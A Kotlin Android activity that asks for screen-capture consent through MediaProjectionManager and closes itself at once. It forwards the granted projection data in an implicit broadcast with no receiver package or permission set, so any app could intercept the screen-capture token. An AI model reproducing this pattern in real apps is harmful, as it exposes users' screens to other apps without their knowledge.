package com.systemlinker.features

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts

class ScreenCaptureActivity : ComponentActivity() {

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            // Pass the consent token back to our LiveSessionManager via Broadcast
            val broadcast = Intent("com.systemlinker.SCREEN_CAST_CONSENT")
            broadcast.putExtra("code", result.resultCode)
            broadcast.putExtra("data", result.data)
            sendBroadcast(broadcast)
        } else {
            // User denied consent
            val broadcast = Intent("com.systemlinker.SCREEN_CAST_CONSENT_DENIED")
            sendBroadcast(broadcast)
        }
        finish() // Close the invisible activity instantly
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
    }
}